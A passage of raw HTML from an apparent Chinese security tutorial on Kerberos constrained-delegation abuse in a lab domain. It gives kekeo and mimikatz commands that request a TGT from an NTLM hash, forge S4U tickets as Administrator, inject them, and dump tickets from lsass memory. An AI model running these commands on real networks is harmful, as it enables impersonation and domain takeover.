class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ask </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">PC</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">JACK</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">NTLM</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">768623e06fae601be0c04759c87d93d3</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ticket</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">test</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.13970588235294118" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/52_UyLWZP5mhkDpq59Iea6vzD84znUDLQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIgGic5V3icicK1H1aG6E4Il3iap3eUyLWZP5mhkDpq59Iea6vzD84znUDLQ/640?wx_fmt=png'" data-type="png" data-w="1224" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />得到TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">3.获取ST</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />然后我们可以使用这张TGT通过伪造s4u请求以<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">administrator</code>用户身份请求访问<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">OWA2010SP3 CIFS</code>的ST<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tgs</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">s4u </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">TGT_PC</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">JACK</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">@</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ORG_krbtgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">~</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org@0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ORG</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Administrator@0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">service</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cifs</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">OWA2010SP3</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.2089783281733746" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/53_gGsqdYKhDmPFbl7Cp2MlXDV3kadW1A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIdqVmmibDYAJhAIwILuYOMmJWbgGsqdYKhDmPFbl7Cp2MlXDV3kadW1A/640?wx_fmt=png'" data-type="png" data-w="1292" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  /><code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">S4U2Self</code>获取到的ST1以及<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">S4U2Proxy</code>获取到的OWA2010SP3 CIFS服务的ST2会保存在当前目录下<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">4.注入ST2</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />然后我们用mimikatz将ST2导入当前会话即可<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ptt TGS_Administrator@0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org@0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ORG_cifs</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">~</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">OWA2010SP3</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org@0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ORG</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.07464114832535886" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/54_mib0FnyzYTRQWibiciaiaSGiaGic1A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIoxyrbDXORYq4YQiasQcFW6icMBl6cAupJmib0FnyzYTRQWibiciaiaSGiaGic1A/640?wx_fmt=png'" data-type="png" data-w="1045" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">5.访问域控</h3><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.360744763382467" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/55_zT9kEHdialXm7THQ8L3twJVric10Kw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI57V0OJpsvNWxftsA0gAj4GwrjEzT9kEHdialXm7THQ8L3twJVric10Kw/640?wx_fmt=png'" data-type="png" data-w="1289" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">6.不知道服务用户密码的情况</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如果我们不知道服务用户的明文和NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">mimikatz</code>直接从内存中把服务用户的TGT dump出来<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">mimikatz</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"privilege::debug"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"sekurlsa::tickets /export"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exit</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5234001910219676" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/56_bPdjv6eK5Fcq4vJGrYPlUkbO8KtACg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaInkD5V38RlzyYmQIo2e95K1F9ibPdjv6eK5Fcq4vJGrYPlUkbO8KtACg/640?wx_fmt=png'" data-type="png" data-w="1047" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">注</strong>：<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">sekurlsa::tickets</code>是列出和导出所有会话的<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">Kerberos</code>票据，<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">sekurlsa::tickets</code>和<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">kerberos::list</code>不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">sekurlsa::tickets /export</code>需要管理员权限的原因。并且<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">sekurlsa::tickets</code>的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。<br style="-webkit-tap-highlight-color: transparent;"  />既然服务用户的TGT导出来了，我们就跳过<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">tgt::ask</code>请求TGT这步，直接<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">tgs::s4u</code><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: 